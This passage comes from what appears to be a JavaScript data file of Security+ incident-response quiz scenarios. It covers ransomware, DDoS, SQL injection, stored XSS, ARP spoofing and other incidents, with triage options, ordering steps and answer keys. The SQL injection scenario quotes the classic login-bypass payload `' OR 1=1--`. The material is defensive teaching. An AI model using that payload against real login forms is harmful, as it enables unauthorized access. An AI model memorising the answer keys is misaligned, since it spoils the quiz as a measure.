        prompt: 'Order the response steps.',
        explanation: 'NIST SP 800-61 sequencing: contain the financial loss (bank), then eradicate the vector (block spoofed domain), then recover (verify no other fraudulent payments) before lessons learned (payment-verification procedure).',
        payload: { items: [
          { id: 'a', label: 'Contact the bank to attempt to recall the wire transfer' },
          { id: 'b', label: 'Block the look-alike domain at the email gateway' },
          { id: 'c', label: 'Audit recent outgoing payments for other fraudulent transfers' },
          { id: 'd', label: 'Implement a call-back verification policy for wire requests' }
        ] },
        answer: { correctOrder: ['a', 'b', 'c', 'd'] } }
    ]
  },

  // 2. Ransomware — Containment emphasis
  {
    id: 'sp-ir-ransomware-fileserver', cert: 'secplus', objective: '4.8', topic: 'Incident Response',
    title: 'Ransomware on the file server', estMinutes: 5, archetype: 'incident',
    scenario: 'Employees report they can no longer open shared documents. File names on SRV-FILE now end in ".locked" and a ransom note appears in every folder. The backup server on the same VLAN is also showing signs of encryption activity.',
    assets: { reference: { kind: 'timeline', stages: [
      { id: 's1', icon: 'lock', label: 'Users report shared files renamed with .locked extension', time: 'T+0m' },
      { id: 's2', icon: 'note', label: 'Ransom note found in every network share', time: 'T+5m' },
      { id: 's3', icon: 'disk', label: 'Backup server on the same VLAN shows encryption activity starting', time: 'T+9m' }
    ] } },
    steps: [
      { id: 't1', type: 'configure', points: 1,
        prompt: 'Triage this incident.',
        explanation: 'Active ransomware spreading to the backup server is a critical incident — it threatens both production data and recovery capability. The first action must be to isolate the affected segment from the network to stop the encryption from spreading further, before any eradication or recovery work begins.',
        payload: { slots: [
          { id: 'sev', label: 'Severity', options: [
            { id: 'low', text: 'Low' }, { id: 'med', text: 'Medium' },
            { id: 'high', text: 'High' }, { id: 'crit', text: 'Critical' }
          ] },
          { id: 'first', label: 'First containment action', options: [
            { id: 'isolate', text: 'Isolate SRV-FILE and the backup server from the network' },
            { id: 'restore', text: 'Immediately restore SRV-FILE from the most recent backup' },
            { id: 'pay', text: 'Pay the ransom to get the decryption key' },
            { id: 'patch', text: 'Patch SRV-FILE\'s operating system' }
          ] }
        ] },
        answer: { slots: { sev: 'crit', first: 'isolate' } } },
      { id: 'o1', type: 'order', points: 1,
        prompt: 'Order the response steps.',
        explanation: 'Isolate first to stop the spread, then eradicate the ransomware binary/persistence, then recover from a verified clean, offline backup, and finally document lessons learned (e.g., segmenting backups, tightening RDP/exposed services).',
        payload: { items: [
          { id: 'a', label: 'Isolate the affected servers from the network' },
          { id: 'b', label: 'Identify and remove the ransomware and any persistence mechanisms' },
          { id: 'c', label: 'Restore data from a verified offline/immutable backup' },
          { id: 'd', label: 'Document the incident and segment backups from production' }
        ] },
        answer: { correctOrder: ['a', 'b', 'c', 'd'] } }
    ]
  },

  // 3. DDoS — Preparation/Detection emphasis
  {
    id: 'sp-ir-ddos-webstore', cert: 'secplus', objective: '4.8', topic: 'Incident Response',
    title: 'Volumetric DDoS against the storefront', estMinutes: 4, archetype: 'incident',
    scenario: 'The e-commerce site becomes unreachable. Monitoring shows inbound traffic spiking to 40x baseline from thousands of distinct source IPs, all hitting the homepage with identical GET requests. No unusual database queries or file changes are observed.',
    assets: { reference: { kind: 'timeline', stages: [
      { id: 's1', icon: 'chart', label: 'Inbound traffic spikes to 40x normal baseline', time: 'T+0m' },
      { id: 's2', icon: 'globe', label: 'Thousands of distinct source IPs send identical GET requests', time: 'T+2m' },
      { id: 's3', icon: 'down', label: 'Web servers become unresponsive; legitimate customers cannot check out', time: 'T+6m' }
    ] } },
    steps: [
      { id: 't1', type: 'configure', points: 1,
        prompt: 'Triage this incident.',
        explanation: 'A volumetric flood from many distinct IPs with no data compromise is a distributed denial-of-service attack against availability. Because the storefront is fully down, this is critical. The first action is to engage upstream DDoS mitigation (scrubbing/rate limiting via the CDN or ISP), not to patch or investigate individual hosts.',
        payload: { slots: [
          { id: 'sev', label: 'Severity', options: [
            { id: 'low', text: 'Low' }, { id: 'med', text: 'Medium' },
            { id: 'high', text: 'High' }, { id: 'crit', text: 'Critical' }
          ] },
          { id: 'first', label: 'First containment action', options: [
            { id: 'scrub', text: 'Enable upstream DDoS scrubbing / rate limiting via the CDN or ISP' },
            { id: 'reboot', text: 'Reboot the web servers' },
            { id: 'patch', text: 'Patch the web application for SQL injection' },
            { id: 'forensics', text: 'Begin a full disk forensic image of the database server' }
          ] }
        ] },
        answer: { slots: { sev: 'crit', first: 'scrub' } } },
      { id: 'o1', type: 'order', points: 1,
        prompt: 'Order the response steps.',
        explanation: 'Contain by engaging upstream mitigation, eradicate by blackholing/blocking the worst offending sources, recover by confirming normal service, then apply lessons learned by adding a standing DDoS mitigation contract or capacity plan.',
        payload: { items: [
          { id: 'a', label: 'Engage upstream DDoS scrubbing / rate limiting' },
          { id: 'b', label: 'Block or blackhole the highest-volume offending source ranges' },
          { id: 'c', label: 'Confirm the storefront is reachable and responsive again' },
          { id: 'd', label: 'Establish a standing DDoS mitigation service and capacity plan' }
        ] },
        answer: { correctOrder: ['a', 'b', 'c', 'd'] } }
    ]
  },

  // 4. Insider threat — Lessons learned emphasis, network reference
  {
    id: 'sp-ir-insider-exfil', cert: 'secplus', objective: '4.8', topic: 'Incident Response',
    title: 'Departing employee data theft', estMinutes: 5, archetype: 'incident',
    scenario: 'A sales engineer submitted their resignation this morning. DLP logs show that last night, from their laptop, the entire customer contract repository was copied to a personal USB drive and uploaded to a personal cloud storage account.',
    assets: { reference: { kind: 'network', devices: [
      { id: 'lap', label: 'SE-LAPTOP', type: 'workstation', zone: 'internal', x: 60, y: 90, state: 'compromised' },
      { id: 'usb', label: 'USB Drive', type: 'device', zone: 'internal', x: 220, y: 90, state: 'affected' },
      { id: 'fs', label: 'CONTRACTS-SHARE', type: 'server', zone: 'internal', x: 60, y: 170, state: 'affected' },
      { id: 'cloud', label: 'Personal Cloud', type: 'external', zone: 'external', x: 400, y: 90, state: 'clean' }
    ], links: [
      { from: 'fs', to: 'lap', kind: 'attack' },
      { from: 'lap', to: 'usb', kind: 'attack' },
      { from: 'lap', to: 'cloud', kind: 'attack' }
    ] } },
    steps: [
      { id: 't1', type: 'configure', points: 1,
        prompt: 'Triage this incident.',
        explanation: 'A trusted insider exfiltrating an entire contract repository to personal storage right before departure is a high-severity insider threat and data-loss event. The first action is to immediately suspend the employee\'s account and access to prevent further exfiltration, before any conversation or investigation continues.',
        payload: { slots: [
          { id: 'sev', label: 'Severity', options: [
            { id: 'low', text: 'Low' }, { id: 'med', text: 'Medium' },
            { id: 'high', text: 'High' }, { id: 'crit', text: 'Critical' }
          ] },
          { id: 'first', label: 'First containment action', options: [
            { id: 'suspend', text: 'Immediately suspend the employee\'s account and remote access' },
            { id: 'confront', text: 'Have the employee\'s manager ask them about the USB drive' },
            { id: 'wipe', text: 'Remote-wipe the laptop without preserving evidence' },
            { id: 'ignore', text: 'Wait until the employee\'s last day to review the logs' }
          ] }
        ] },
        answer: { slots: { sev: 'high', first: 'suspend' } } },
      { id: 'o1', type: 'order', points: 1,
        prompt: 'Order the response steps.',
        explanation: 'Contain by cutting off access, preserve evidence (forensic image) before eradicating anything, involve HR/Legal for the personnel and possible legal action, then update DLP/offboarding policy as the lessons-learned output.',
        payload: { items: [
          { id: 'a', label: 'Suspend account access and revoke remote/VPN sessions' },
          { id: 'b', label: 'Forensically preserve the laptop and DLP logs as evidence' },
          { id: 'c', label: 'Loop in HR and Legal regarding the data theft' },
          { id: 'd', label: 'Update the offboarding checklist and DLP policy' }
        ] },
        answer: { correctOrder: ['a', 'b', 'c', 'd'] } }
    ]
  },

  // 5. Malware/C2 beacon — Detection & Analysis emphasis
  {
    id: 'sp-ir-c2-beacon', cert: 'secplus', objective: '4.9', topic: 'Incident Response',
    title: 'Beaconing workstation', estMinutes: 4, archetype: 'incident',
    scenario: 'The SIEM flags a workstation making a DNS query to a newly registered domain every 60 seconds, each time exchanging a small, consistent amount of data. No user is logged in overnight when the beaconing continues.',
    assets: { reference: { kind: 'timeline', stages: [
      { id: 's1', icon: 'radio', label: 'SIEM detects periodic DNS queries to a newly registered domain every 60s', time: 'T+0m' },
      { id: 's2', icon: 'moon', label: 'Beaconing continues overnight with no user logged in', time: 'T+8h' },
      { id: 's3', icon: 'data', label: 'Small, consistent data exchange on each beacon suggests command-and-control', time: 'T+8h5m' }
    ] } },
    steps: [
      { id: 't1', type: 'configure', points: 1,
        prompt: 'Triage this incident.',
        explanation: 'Regular, low-and-slow beaconing to a newly registered domain with no user activity is a textbook command-and-control (C2) indicator. This is high severity because an attacker likely has a foothold. The first action is to isolate the host from the network to cut off the C2 channel while preserving it for analysis.',
        payload: { slots: [
          { id: 'sev', label: 'Severity', options: [
            { id: 'low', text: 'Low' }, { id: 'med', text: 'Medium' },
            { id: 'high', text: 'High' }, { id: 'crit', text: 'Critical' }
          ] },
          { id: 'first', label: 'First containment action', options: [
            { id: 'isolate', text: 'Isolate the workstation from the network (keep it powered on)' },
            { id: 'poweroff', text: 'Power off the workstation immediately' },
            { id: 'ignore', text: 'Whitelist the domain since it may be a false positive' },
            { id: 'reimage', text: 'Reimage the workstation right away' }
          ] }
        ] },
        answer: { slots: { sev: 'high', first: 'isolate' } } },
      { id: 'o1', type: 'order', points: 1,
        prompt: 'Order the response steps.',
        explanation: 'Isolate to stop further C2 traffic while preserving volatile memory for analysis, analyze/eradicate the malware once identified, recover by reimaging or verifying clean, then feed the C2 domain into blocklists as lessons learned.',
        payload: { items: [
          { id: 'a', label: 'Isolate the host from the network without powering it off' },
          { id: 'b', label: 'Capture memory and identify the malware and its persistence mechanism' },
          { id: 'c', label: 'Reimage the host and restore from a known-good state' },
          { id: 'd', label: 'Add the C2 domain to threat intel blocklists' }
        ] },
        answer: { correctOrder: ['a', 'b', 'c', 'd'] } }
    ]
  },

  // 6. Web app attack — SQLi — Detection & Analysis emphasis
  {
    id: 'sp-ir-sqli-customerdb', cert: 'secplus', objective: '4.8', topic: 'Incident Response',
    title: 'SQL injection against the customer portal', estMinutes: 5, archetype: 'incident',
    scenario: 'WAF logs show a login form receiving requests with payloads like `\' OR 1=1--`. Shortly after, the database server logs an unusually large SELECT query returning the entire customers table, executed under the web application\'s service account.',
    assets: { reference: { kind: 'network', devices: [
      { id: 'atk', label: 'Attacker', type: 'external', zone: 'external', x: 40, y: 90, state: 'clean' },
      { id: 'waf', label: 'WAF', type: 'firewall', zone: 'dmz', x: 200, y: 90, state: 'clean' },
      { id: 'web', label: 'WEB-PORTAL', type: 'server', zone: 'dmz', x: 340, y: 90, state: 'affected' },
      { id: 'db', label: 'CUSTOMER-DB', type: 'database', zone: 'internal', x: 480, y: 90, state: 'compromised' }
    ], links: [
      { from: 'atk', to: 'waf', kind: 'attack' },
      { from: 'waf', to: 'web', kind: 'attack' },
      { from: 'web', to: 'db', kind: 'attack' }
    ] } },
    steps: [
      { id: 't1', type: 'configure', points: 1,
        prompt: 'Triage this incident.',
        explanation: 'A classic SQL injection payload followed by a bulk SELECT that dumped the entire customers table is a critical confirmed data breach. The first action is to take the vulnerable login form/endpoint offline (or block it at the WAF) to stop further injection while the application is fixed.',
        payload: { slots: [
          { id: 'sev', label: 'Severity', options: [
            { id: 'low', text: 'Low' }, { id: 'med', text: 'Medium' },
            { id: 'high', text: 'High' }, { id: 'crit', text: 'Critical' }
          ] },
          { id: 'first', label: 'First containment action', options: [
            { id: 'block', text: 'Block the vulnerable endpoint at the WAF and take it offline' },
            { id: 'rotate', text: 'Rotate all customer passwords immediately without investigating' },
            { id: 'ignore', text: 'Monitor the endpoint for a few more days to gather evidence' },
            { id: 'delete', text: 'Delete the WAF logs to reduce noise' }
          ] }
        ] },
        answer: { slots: { sev: 'crit', first: 'block' } } },
      { id: 'o1', type: 'order', points: 1,
        prompt: 'Order the response steps.',
        explanation: 'Contain by blocking the vulnerable endpoint, eradicate by patching the injection flaw (parameterized queries), recover by restoring the service and rotating exposed credentials, then notify affected customers/regulators as required and document lessons learned.',
        payload: { items: [
          { id: 'a', label: 'Block the vulnerable endpoint at the WAF' },
          { id: 'b', label: 'Patch the application to use parameterized queries' },
          { id: 'c', label: 'Rotate database credentials and restore the service' },
          { id: 'd', label: 'Notify affected customers per breach-notification requirements' }
        ] },
        answer: { correctOrder: ['a', 'b', 'c', 'd'] } }
    ]
  },

  // 7. Web app attack — XSS — Eradication emphasis
  {
    id: 'sp-ir-xss-comments', cert: 'secplus', objective: '4.8', topic: 'Incident Response',
    title: 'Stored XSS harvesting session cookies', estMinutes: 4, archetype: 'incident',
    scenario: 'A support forum\'s comment field was found to store `<script>` tags that quietly send visiting users\' session cookies to an external server. Several customer accounts have since shown logins from unfamiliar locations.',
    assets: { reference: { kind: 'timeline', stages: [
      { id: 's1', icon: 'code', label: 'Malicious script stored in a public comment field', time: 'T-3d' },
      { id: 's2', icon: 'cookie', label: 'Script silently exfiltrates visiting users\' session cookies', time: 'T-2d' },
      { id: 's3', icon: 'login', label: 'Multiple customer accounts show logins from unfamiliar locations', time: 'T+0m' }
    ] } },
    steps: [
      { id: 't1', type: 'configure', points: 1,
        prompt: 'Triage this incident.',
        explanation: 'Stored XSS that has already led to session hijacking and unauthorized account access across multiple customers is a critical, active incident. The first action is to remove the malicious comment content and invalidate the stolen sessions so the attacker loses access even before the underlying flaw is patched.',
        payload: { slots: [
          { id: 'sev', label: 'Severity', options: [
            { id: 'low', text: 'Low' }, { id: 'med', text: 'Medium' },
            { id: 'high', text: 'High' }, { id: 'crit', text: 'Critical' }
          ] },
          { id: 'first', label: 'First containment action', options: [
            { id: 'purge', text: 'Remove the malicious comment content and invalidate active sessions' },
            { id: 'shutdown', text: 'Permanently shut down the forum feature' },
            { id: 'ignore', text: 'Ask affected users to clear their browser cache' },
            { id: 'wait', text: 'Wait for the next scheduled maintenance window to fix it' }
          ] }
        ] },
        answer: { slots: { sev: 'crit', first: 'purge' } } },
      { id: 'o1', type: 'order', points: 1,
        prompt: 'Order the response steps.',
        explanation: 'Contain by purging the payload and killing active sessions, eradicate the root cause by adding output encoding/CSP so injected scripts cannot execute, recover by having affected users re-authenticate, then document input-validation lessons learned.',
        payload: { items: [
          { id: 'a', label: 'Remove the malicious script and invalidate stolen sessions' },
          { id: 'b', label: 'Add output encoding and a Content Security Policy to the comment field' },
          { id: 'c', label: 'Force affected users to re-authenticate and reset passwords' },
          { id: 'd', label: 'Add input-validation testing to the secure development lifecycle' }
        ] },
        answer: { correctOrder: ['a', 'b', 'c', 'd'] } }
    ]
  },

  // 8. Credential stuffing / brute force — Forensics & Investigations (data-source selection, chain of custody)
  {
    id: 'sp-ir-credstuffing-login', cert: 'secplus', objective: '4.9', topic: 'Forensics & Investigations',
    title: 'Credential stuffing against the customer login — evidence handling', estMinutes: 4, archetype: 'incident',
    scenario: 'Tens of thousands of login attempts hit the customer login in an hour, using username/password pairs matching a recently leaked third-party breach dump. About 3% succeed. Legal has asked the security team to determine which requests came from which source IPs and to preserve evidence in case law enforcement gets involved.',
    assets: { reference: { kind: 'timeline', stages: [
      { id: 's1', icon: 'list', label: 'Tens of thousands of login attempts in one hour using leaked breach-dump credentials', time: 'T+0m' },
      { id: 's2', icon: 'unlock', label: 'About 3% of attempts succeed (password reuse)', time: 'T+35m' },
      { id: 's3', icon: 'key', label: 'Successful logins immediately followed by password-reset requests', time: 'T+36m' }
    ] } },
    steps: [
      { id: 't1', type: 'configure', points: 1,
        prompt: 'Select the investigation approach.',
        explanation: 'The application/authentication log is the correct data source here — it records username, source IP, timestamp, and outcome for every login attempt, which is exactly what\'s needed to correlate the attack pattern to specific accounts and sources. Once evidence is identified for a legal hold, the exported log data must be hashed at collection time so its integrity can be proven later; this is the starting point of chain of custody, not an optional extra step.',
        payload: { slots: [
          { id: 'source', label: 'Best data source to correlate attempts to accounts/IPs', options: [
            { id: 'authlog', text: 'Authentication/application logs (username, source IP, timestamp, outcome)' },
            { id: 'dnslog', text: 'DNS resolver query logs' },
            { id: 'netflow', text: 'NetFlow summary records only' },
            { id: 'antivirus', text: 'Endpoint antivirus logs' }
          ] },
          { id: 'first', label: 'First evidence-handling action', options: [
            { id: 'hash', text: 'Export the relevant log data and generate a cryptographic hash of it' },
            { id: 'editlogs', text: 'Edit the log file to remove unrelated entries before saving it' },
            { id: 'emailself', text: 'Email the raw log file to your personal account for safekeeping' },
            { id: 'deleteold', text: 'Delete older log entries to keep the file size manageable' }
          ] }
        ] },
        answer: { slots: { source: 'authlog', first: 'hash' } } },
      { id: 'o1', type: 'order', points: 1,
        prompt: 'Order the evidence-handling steps to preserve a defensible chain of custody.',
        explanation: 'Proper evidence handling: identify and collect the relevant log source first, hash it immediately at collection to prove integrity, document who collected it and when on a chain-of-custody form, then store the original in a access-controlled, tamper-evident location and work only from a copy going forward.',
        payload: { items: [
          { id: 'a', label: 'Identify and export the relevant authentication log records' },
          { id: 'b', label: 'Generate a cryptographic hash of the exported log data' },
          { id: 'c', label: 'Complete a chain-of-custody form documenting collector, time, and hash' },
          { id: 'd', label: 'Store the original in a secured, access-controlled location and analyze only a copy' }
        ] },
        answer: { correctOrder: ['a', 'b', 'c', 'd'] } }
    ]
  },

  // 9. Data exfiltration — Recovery emphasis
  {
    id: 'sp-ir-exfil-cloudstorage', cert: 'secplus', objective: '4.8', topic: 'Incident Response',
    title: 'Large outbound transfer to unknown cloud storage', estMinutes: 5, archetype: 'incident',
    scenario: 'DLP alerts on a database server sending 15GB to an unfamiliar cloud storage IP over HTTPS at 3am, well outside the nightly backup window. The transfer used credentials belonging to a service account that should only ever run internal batch jobs.',
    assets: { reference: { kind: 'network', devices: [
      { id: 'db', label: 'DB-PROD', type: 'database', zone: 'internal', x: 60, y: 90, state: 'compromised' },
      { id: 'fw', label: 'FW-EDGE', type: 'firewall', zone: 'dmz', x: 240, y: 90, state: 'clean' },
      { id: 'ext', label: 'Unknown Cloud Storage', type: 'external', zone: 'external', x: 420, y: 90, state: 'clean' }
    ], links: [
      { from: 'db', to: 'fw', kind: 'attack' },
      { from: 'fw', to: 'ext', kind: 'attack' }
    ] } },
    steps: [
      { id: 't1', type: 'configure', points: 1,
        prompt: 'Triage this incident.',
        explanation: 'A production database sending 15GB to unrecognized external cloud storage at an abnormal hour, using a service account outside its normal behavior, is a critical data-exfiltration event. The first action is to block outbound traffic to that destination and disable the misused service account to stop the ongoing transfer.',
        payload: { slots: [
          { id: 'sev', label: 'Severity', options: [
            { id: 'low', text: 'Low' }, { id: 'med', text: 'Medium' },
            { id: 'high', text: 'High' }, { id: 'crit', text: 'Critical' }
          ] },
          { id: 'first', label: 'First containment action', options: [
            { id: 'blockeg', text: 'Block outbound traffic to the destination and disable the service account' },
            { id: 'restart', text: 'Restart the database service' },
            { id: 'ignorelog', text: 'Note it for the weekly security review' },
            { id: 'grantmore', text: 'Grant the service account broader access to investigate' }
          ] }
        ] },
        answer: { slots: { sev: 'crit', first: 'blockeg' } } },
      { id: 'o1', type: 'order', points: 1,
        prompt: 'Order the response steps.',
        explanation: 'Contain by cutting the egress path and disabling the compromised credential, eradicate by finding how the credential was obtained (e.g., leaked key) and rotating it, recover by verifying database integrity and restoring least-privilege scope, then tighten egress filtering and DLP rules as lessons learned.',
        payload: { items: [
          { id: 'a', label: 'Block the outbound destination and disable the service account' },
          { id: 'b', label: 'Determine how the credential was compromised and rotate it' },
          { id: 'c', label: 'Verify database integrity and restore least-privilege scope' },
          { id: 'd', label: 'Tighten egress filtering and DLP rules for service accounts' }
        ] },
        answer: { correctOrder: ['a', 'b', 'c', 'd'] } }
    ]
  },

  // 10. Supply-chain — Preparation/Detection emphasis
  {
    id: 'sp-ir-supplychain-update', cert: 'secplus', objective: '4.8', topic: 'Incident Response',
    title: 'Malicious vendor software update', estMinutes: 5, archetype: 'incident',
    scenario: 'A routine update from a trusted network-monitoring vendor was pushed to 200 endpoints overnight. The next morning, EDR flags that the updated binary is contacting a command-and-control server not associated with the vendor at all.',
    assets: { reference: { kind: 'timeline', stages: [
      { id: 's1', icon: 'download', label: 'Trusted vendor pushes a routine software update to 200 endpoints', time: 'T-8h' },
      { id: 's2', icon: 'shield', label: 'EDR flags the updated binary contacting an unrecognized external server', time: 'T+0m' },
      { id: 's3', icon: 'network', label: 'The same binary is now present across all 200 endpoints', time: 'T+0m' }
    ] } },
    steps: [
      { id: 't1', type: 'configure', points: 1,
        prompt: 'Triage this incident.',
        explanation: 'A trusted vendor\'s update binary calling out to a server unrelated to that vendor, and already present across 200 machines, is a critical supply-chain compromise — the blast radius is organization-wide. The first action is to halt/roll back the update and block the malicious binary\'s network communication across all affected endpoints.',
        payload: { slots: [
          { id: 'sev', label: 'Severity', options: [
            { id: 'low', text: 'Low' }, { id: 'med', text: 'Medium' },
            { id: 'high', text: 'High' }, { id: 'crit', text: 'Critical' }
          ] },
          { id: 'first', label: 'First containment action', options: [
            { id: 'rollback', text: 'Roll back the update and block the malicious binary\'s network access org-wide' },
            { id: 'trustvendor', text: 'Contact the vendor and wait for their guidance before acting' },
            { id: 'onehost', text: 'Isolate only the one endpoint that triggered the alert' },
            { id: 'reinstall', text: 'Reinstall the vendor software on all endpoints' }
          ] }
        ] },
        answer: { slots: { sev: 'crit', first: 'rollback' } } },
      { id: 'o1', type: 'order', points: 1,
        prompt: 'Order the response steps.',
        explanation: 'Contain by rolling back the compromised update and blocking its C2 traffic fleet-wide, eradicate by removing the malicious binary from every endpoint, recover by validating a clean vendor build before redeploying, then add software supply-chain vetting (code signing verification, staged rollout) as lessons learned.',
        payload: { items: [
          { id: 'a', label: 'Roll back the update and block the malicious binary\'s C2 traffic fleet-wide' },
          { id: 'b', label: 'Remove the malicious binary from all 200 endpoints' },
          { id: 'c', label: 'Validate a clean vendor build before redeploying' },
          { id: 'd', label: 'Add staged rollout and code-signing verification for vendor updates' }
        ] },
        answer: { correctOrder: ['a', 'b', 'c', 'd'] } }
    ]
  },

  // 11. On-path / MITM — Detection & Analysis emphasis, network reference
  {
    id: 'sp-ir-onpath-conference', cert: 'secplus', objective: '4.8', topic: 'Incident Response',
    title: 'On-path attack at the branch office', estMinutes: 5, archetype: 'incident',
    scenario: 'Staff at a branch office report certificate warnings when reaching internal HR systems. Network captures show ARP tables listing a rogue laptop as the default gateway MAC address, and its traffic is being relayed on to the real gateway after being decrypted and re-encrypted.',
    assets: { reference: { kind: 'network', devices: [
      { id: 'wks', label: 'BRANCH-WKS', type: 'workstation', zone: 'internal', x: 40, y: 90, state: 'affected' },
      { id: 'rogue', label: 'Rogue Laptop', type: 'attacker', zone: 'internal', x: 200, y: 150, state: 'compromised' },
      { id: 'gw', label: 'GW-BRANCH', type: 'router', zone: 'internal', x: 360, y: 90, state: 'clean' },
      { id: 'hr', label: 'HR-APP', type: 'server', zone: 'internal', x: 500, y: 90, state: 'clean' }
    ], links: [
      { from: 'wks', to: 'rogue', kind: 'attack' },
      { from: 'rogue', to: 'gw', kind: 'attack' },
      { from: 'gw', to: 'hr', kind: 'normal' }
    ] } },
    steps: [
      { id: 't1', type: 'configure', points: 1,
        prompt: 'Triage this incident.',
        explanation: 'ARP spoofing that places a rogue device between clients and the real gateway, decrypting and re-encrypting traffic in transit, is a classic on-path (man-in-the-middle) attack capable of harvesting HR credentials. This is high severity given sensitive HR data is exposed. The first action is to physically or logically remove the rogue device from the network.',
        payload: { slots: [
          { id: 'sev', label: 'Severity', options: [
            { id: 'low', text: 'Low' }, { id: 'med', text: 'Medium' },
            { id: 'high', text: 'High' }, { id: 'crit', text: 'Critical' }
          ] },
          { id: 'first', label: 'First containment action', options: [
            { id: 'removerogue', text: 'Disconnect the rogue laptop from the network' },
            { id: 'ignorecerts', text: 'Tell users to click through the certificate warnings' },
            { id: 'reboot', text: 'Reboot the branch gateway router' },
            { id: 'patchhr', text: 'Patch the HR application server' }
          ] }
        ] },
        answer: { slots: { sev: 'high', first: 'removerogue' } } },
      { id: 'o1', type: 'order', points: 1,
        prompt: 'Order the response steps.',
        explanation: 'Contain by removing the rogue device, eradicate by clearing poisoned ARP tables and confirming no other rogue devices exist, recover by having affected users change passwords entered during the attack, then add dynamic ARP inspection / 802.1X port security as lessons learned.',
        payload: { items: [
          { id: 'a', label: 'Disconnect the rogue laptop from the network' },
          { id: 'b', label: 'Clear poisoned ARP tables and sweep for other rogue devices' },
          { id: 'c', label: 'Have affected users change passwords entered during the attack' },
          { id: 'd', label: 'Enable dynamic ARP inspection and 802.1X port security' }
        ] },
        answer: { correctOrder: ['a', 'b', 'c', 'd'] } }
    ]
  },

  // 12. DNS poisoning — Containment emphasis
  {
    id: 'sp-ir-dns-poison-portal', cert: 'secplus', objective: '4.8', topic: 'Incident Response',
    title: 'DNS cache poisoning redirects the employee portal', estMinutes: 4, archetype: 'incident',
    scenario: 'Employees typing the internal HR portal URL are landing on a convincing fake login page that harvests credentials. The internal DNS resolver\'s cache shows the portal\'s hostname now resolves to an external IP address that was never configured by IT.',
    assets: { reference: { kind: 'timeline', stages: [
      { id: 's1', icon: 'dns', label: 'Internal DNS resolver cache shows the portal hostname resolving to an unfamiliar external IP', time: 'T+0m' },
      { id: 's2', icon: 'globe', label: 'Employees are silently redirected to a fake login page', time: 'T+3m' },
      { id: 's3', icon: 'key', label: 'Several employees have already entered their credentials on the fake page', time: 'T+15m' }
    ] } },
    steps: [
      { id: 't1', type: 'configure', points: 1,
        prompt: 'Triage this incident.',
        explanation: 'A poisoned DNS cache silently redirecting employees to a credential-harvesting page, with credentials already captured, is a critical incident. The first action is to flush the poisoned DNS cache and correct the record so users stop being redirected before any further credentials are stolen.',
        payload: { slots: [
          { id: 'sev', label: 'Severity', options: [
            { id: 'low', text: 'Low' }, { id: 'med', text: 'Medium' },
            { id: 'high', text: 'High' }, { id: 'crit', text: 'Critical' }
          ] },
          { id: 'first', label: 'First containment action', options: [
            { id: 'flush', text: 'Flush the poisoned DNS cache and correct the record' },
            { id: 'shutdownportal', text: 'Permanently decommission the HR portal' },
            { id: 'emailall', text: 'Email all employees the new correct URL and take no other action' },
            { id: 'ignoreit', text: 'Wait for the TTL to expire naturally' }
          ] }
        ] },
        answer: { slots: { sev: 'crit', first: 'flush' } } },
      { id: 'o1', type: 'order', points: 1,
        prompt: 'Order the response steps.',
        explanation: 'Contain by flushing and correcting the DNS cache, eradicate by identifying and closing the DNS server vulnerability that allowed poisoning, recover by forcing password resets for anyone who used the fake page, then enable DNSSEC as the lessons-learned control.',
        payload: { items: [
          { id: 'a', label: 'Flush the poisoned DNS cache and correct the record' },
          { id: 'b', label: 'Identify and patch the DNS server vulnerability that allowed poisoning' },
          { id: 'c', label: 'Force password resets for employees who used the fake login page' },
          { id: 'd', label: 'Enable DNSSEC on the internal DNS infrastructure' }
        ] },
        answer: { correctOrder: ['a', 'b', 'c', 'd'] } }
    ]
  },

  // 13. Privilege escalation — Eradication emphasis
  {
    id: 'sp-ir-privesc-admin', cert: 'secplus', objective: '4.8', topic: 'Incident Response',
    title: 'Standard user escalates to domain admin', estMinutes: 5, archetype: 'incident',
    scenario: 'A help-desk technician\'s standard account is observed creating a new account and adding it to the Domain Admins group, an action that account has no legitimate reason to perform. The new account then accesses several servers it has never touched before.',
    assets: { reference: { kind: 'timeline', stages: [
      { id: 's1', icon: 'user', label: 'Help-desk standard account creates a new user account', time: 'T+0m' },
      { id: 's2', icon: 'shield', label: 'New account is added to the Domain Admins group', time: 'T+1m' },
      { id: 's3', icon: 'server', label: 'New privileged account accesses multiple servers never touched before', time: 'T+6m' }
    ] } },
    steps: [
      { id: 't1', type: 'configure', points: 1,
        prompt: 'Triage this incident.',
        explanation: 'A low-privilege account performing a privilege-escalation action it has no business reason to perform, followed by that new privileged account touching unfamiliar servers, is a critical compromise — likely exploiting a vulnerability or stolen credentials to gain domain-wide control. The first action is to disable both the compromised account and the newly created rogue admin account.',
        payload: { slots: [
          { id: 'sev', label: 'Severity', options: [
            { id: 'low', text: 'Low' }, { id: 'med', text: 'Medium' },
            { id: 'high', text: 'High' }, { id: 'crit', text: 'Critical' }
          ] },
          { id: 'first', label: 'First containment action', options: [
            { id: 'disableboth', text: 'Disable both the compromised help-desk account and the rogue admin account' },
            { id: 'reset1', text: 'Just reset the help-desk account\'s password and continue monitoring' },
            { id: 'ignoreacct', text: 'Leave the accounts active to see what else the attacker does' },
            { id: 'promote', text: 'Promote a different account to admin to compare behavior' }
          ] }
        ] },
        answer: { slots: { sev: 'crit', first: 'disableboth' } } },
      { id: 'o1', type: 'order', points: 1,
        prompt: 'Order the response steps.',
        explanation: 'Contain by disabling both accounts, eradicate by finding and patching the privilege-escalation vector (misconfigured ACL or vulnerability) so it cannot be repeated, recover by auditing everything the rogue admin account touched and restoring integrity, then tighten group-membership change alerting as lessons learned.',
        payload: { items: [
          { id: 'a', label: 'Disable the compromised account and the rogue admin account' },
          { id: 'b', label: 'Identify and fix the privilege-escalation vector (misconfigured ACL/vuln)' },
          { id: 'c', label: 'Audit every server the rogue admin account touched and restore integrity' },
          { id: 'd', label: 'Enable real-time alerting on privileged group membership changes' }
        ] },
        answer: { correctOrder: ['a', 'b', 'c', 'd'] } }
    ]
  },

  // 14. Phishing/BEC — attachment dropper, single-step triage focus
  {
    id: 'sp-ir-phishing-macro-drop', cert: 'secplus', objective: '4.8', topic: 'Incident Response',
    title: 'Macro-enabled attachment drops a loader', estMinutes: 4, archetype: 'incident',
    scenario: 'An HR employee opened an attachment titled "Candidate_Resume.docm" and enabled macros when prompted. Within a minute, EDR observed the Office process spawning PowerShell, which downloaded a second-stage payload from a paste site.',
    assets: { reference: { kind: 'timeline', stages: [
      { id: 's1', icon: 'mail', label: 'HR employee opens "Candidate_Resume.docm" and enables macros', time: 'T+0m' },
      { id: 's2', icon: 'terminal', label: 'Office process spawns PowerShell (unusual parent-child relationship)', time: 'T+1m' },
